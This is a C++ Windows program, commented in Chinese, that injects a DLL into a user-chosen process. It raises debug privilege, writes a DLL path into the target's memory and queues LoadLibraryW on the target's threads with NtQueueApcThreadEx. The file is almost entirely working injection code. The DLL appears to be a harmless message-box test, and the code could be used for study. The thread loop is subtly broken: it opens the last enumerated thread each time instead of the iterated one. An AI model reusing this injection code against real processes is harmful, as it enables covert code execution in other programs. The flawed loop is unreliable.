#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include<vector>

typedef NTSTATUS(*NtQueueApcThreadEx)
(
	HANDLE thread,
	ULONG64 flag,
	ULONG64 NormalRoutine,
	ULONG64 NormalContext,
	ULONG64 s1,
	ULONG64 s2
	);
NTSTATUS(*pNtQueueApcThreadEx)
(
	HANDLE thread,
	ULONG64 flag,
	ULONG64 NormalRoutine,
	ULONG64 NormalContext,
	ULONG64 s1,
	ULONG64 s2
	) = NULL;
LPTHREAD_START_ROUTINE pLoadLibrary = NULL;
BOOL EnableDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	// 打开当前进程的访问令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "无法打开进程令牌。错误: " << GetLastError() << std::endl;
		return FALSE;
	}

	// 查找调试特权的LUID
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		std::cerr << "无法查找调试特权的LUID。错误: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}

	// 设置特权
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// 调整特权
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		std::cerr << "无法调整令牌特权。错误: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}

	// 检查调整特权的结果
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		std::cerr << "令牌不具有指定的特权。错误: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


//获取目标pid->申请空间->写入DLL路径->获取LoadLibrary地址->用APC挂钩函数挂上LoadLibrary函数，传参DLL路径


PVOID getFunction(LPCSTR ModuleName, LPCSTR funcName, HMODULE& hMoule) {
	hMoule = GetModuleHandleA(ModuleName);
	if (!hMoule) {
		std::cerr << "模块打开失败" << std::endl;
		exit(1);
	}
	PVOID pfunc = GetProcAddress(hMoule, funcName);
	if (!pfunc) {
		std::cerr << "函数查找失败" << std::endl;
		exit(2);
	}
	return pfunc;
}
//

int main(void) {
	//防止访问权限不够，使用令牌提高权限
	if (!EnableDebugPrivilege()) {
		std::cerr << "调整权限失败" << std::endl;
		return 1;
	}

	//获取Ntdll和NtQueueApcThreadEx
	HMODULE hNtdll;
	pNtQueueApcThreadEx = (NtQueueApcThreadEx)getFunction("Ntdll", "NtQueueApcThreadEx", hNtdll);

	//获取kernal32和LoadLibrary
	HMODULE hKernel32;
	pLoadLibrary = (LPTHREAD_START_ROUTINE)getFunction("kernel32", "LoadLibraryW", hKernel32);

	//获取PID
	DWORD dwPid = 0;
	std::cout << "请输入进程PID：";
	std::cin >> dwPid;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);



	//申请空间
	WCHAR dllpath[] = L"C:\\Users\\a2879\\source\\repos\\valentForAPCinject\\x64\\Debug\\messageboxDLL.dll";
	LPVOID lpDLLpath = VirtualAllocEx(hProcess, NULL, sizeof(dllpath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpDLLpath) {
		std::cerr << "内存分配失败" << std::endl;
		return 0;
	}
	//写入dll路径
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, lpDLLpath, dllpath, sizeof(dllpath) + 1, &bytesWritten)) {
		std::cerr << "写入失败" << std::endl;
		return 0;
	}

	//取线程
	DWORD dwThreadID;
	THREADENTRY32 te32 = {};
	te32.dwSize = sizeof(THREADENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);



	std::vector<DWORD> Vthread = {};

	if (Thread32First(hSnapshot, &te32)) {
		do
		{
			if (te32.th32OwnerProcessID == dwPid) {
				Vthread.push_back(te32.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &te32));
	}

	for (auto it = Vthread.rbegin(); it != Vthread.rend(); it++) {
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
		if (hThread) {
			pNtQueueApcThreadEx(hThread, 1, (ULONG64)pLoadLibrary, (ULONG64)lpDLLpath, NULL, NULL);
			//QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpDLLpath);
			std::cout << "成功执行:" << *it << std::endl;
			CloseHandle(hThread);
			//break;
		}
		else {
			std::cerr << "无法打开线程\n";
		}
	}

	std::cout << "执行结束" << std::endl;
	system("pause");
}
